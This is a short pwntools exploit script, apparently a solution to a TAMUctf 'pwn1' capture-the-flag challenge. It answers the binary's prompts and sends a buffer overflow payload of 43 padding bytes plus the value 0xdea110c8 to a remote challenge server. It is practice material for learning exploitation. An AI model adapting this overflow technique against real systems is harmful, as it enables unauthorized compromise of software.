from pwn import *

#p = process('./pwn1')
p=remote("pwn.tamuctf.com",4321)

p.recvuntil('What... is your name?')
p.sendline('Sir Lancelot of Camelot')
p.recvuntil('What... is your quest?')
p.sendline('To seek the Holy Grail.')

p.recvuntil('What... is my secret?')

payload='a'*43+p32(0xdea110c8)
p.sendline(payload)
a=p.recvall()
print a
